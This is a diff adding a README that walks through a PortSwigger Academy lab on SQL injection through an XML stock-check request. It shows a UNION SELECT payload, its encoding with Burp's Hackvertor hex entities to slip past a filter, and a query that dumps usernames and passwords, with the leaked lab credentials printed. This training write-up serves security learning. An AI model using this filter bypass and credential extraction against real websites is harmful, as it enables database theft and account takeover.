@@ -1,0 +1,51 @@
+# lab17-PortSwigger-SQL-injection-with-filter-bypass-via-XML-encoding
+  
+-1 OPEN BURP SUITE THEN INSTALL THE HACKVERTOR EXTENSIONS
+
+-2 OPEN PROXY AND OPEN THE SITE ON THE BURP BROWSER THEN INTERCEPT ON 
+
+-3 WE KNOW FROM THE LAB THAT THE VULNERABILITY EXISTS ON THE CHECK STOCK THEN WE CLICK ON IT TO GET THE REQUEST ON THE PROXY WE CLICK ON THE REQUEST TEN CTR+R TO SEND IT TO THE REPEATER 
+
+=4 THIS WHAT WE WILL HAVE ON THE REQ 
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+<productId>
+    1 UNION SELECT NULL--
+  </productId>
+    <storeId>
+      1
+    </storeId>
+  </stockCheck>
+
+  IF WE CLICK ON SEND WE WILL HAVE A MESSAGE <"ATTACK DETECTED ">
+
+-5 SO WE HAVE TO USE HACKVERTOR 
+  IN THE REPETER SELECT THE LIGNE WHER WE WRITED THE SQLI ATTACK THEN SELECKT EXTENSIONS->HACKVERTOR=>ENCODE=>HEX_ENTITIES THEN WE WILL HAVE THE SQLI ATTACK ENCODED AND APPEARES LIKE THAT 
+
+  <?xml version="1.0" encoding="UTF-8"?>
+  <stockCheck>
+  <productId>
+    <@hex_entities>         ===============> NOW IT'S ENCODED
+      1 UNION SELECT NULL--
+    </@hex_entities>         ===============> NOW IT'S ENCODED
+    </productId>
+      <storeId>
+        1
+      </storeId>
+    </stockCheck>
+
+-6 NOW WE HAVE TO OUTPUT THE ADMIN'S CREDENTIALS 
+    REOLACIN  1 UNION SELECT NULL-- BY 1 UNION SELECT username || '-' || password FROM users-- THEN PRESS SEND (" || '-' || " WE USED THIS TO SEPARAT THE USERNAMES FROM THE PASSWORDS)
+    (IN THE RESPONS PAGE WE'LL GET THE DATA OUTPUTED)
+    HERE IS THE RESPOND :
+    HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 110
+
+administrator-xigup31ld0utfcy07bgr ---> DATA OUTPUTED 
+wiener-1v8mfk5p2tl8ir4kj522
+carlos-utmo4rfphpk0qpkf4xni
+280 units
+271 units
+-7 NOW WE CLICK ON MY ACCOUNT AND WE ENTER THE ADMIN'S USERNAME AND PASSWORD AND THIS IS HOW WE SOLVE THE LAB.
